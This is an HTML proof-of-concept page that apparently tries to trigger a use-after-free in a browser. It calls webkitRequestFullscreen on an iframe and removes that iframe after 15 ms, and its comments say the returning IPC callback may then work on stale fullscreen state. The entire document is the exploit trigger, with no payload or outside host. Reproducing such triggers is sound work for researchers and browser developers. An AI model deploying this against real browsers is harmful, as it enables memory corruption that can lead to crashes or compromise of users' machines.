<!DOCTYPE html>
<html>
<body>
    <button onclick="triggerUAF()">Trigger UAF</button><br><br>
    <iframe id="target_frame" width="100" height="100"></iframe>
    <script>
        function triggerUAF() {
            var frame = document.getElementById("target_frame");
            if (!frame) return;
            
            // 1. Dispatch IPC
            frame.webkitRequestFullscreen();
            
            // 2. Free the object
            setTimeout(() => {
                frame.remove();
            }, 15); 
            // 3. The returning IPC callback may operate on stale fullscreen-related state after iframe removal.
        }
    </script>
</body>
</html>
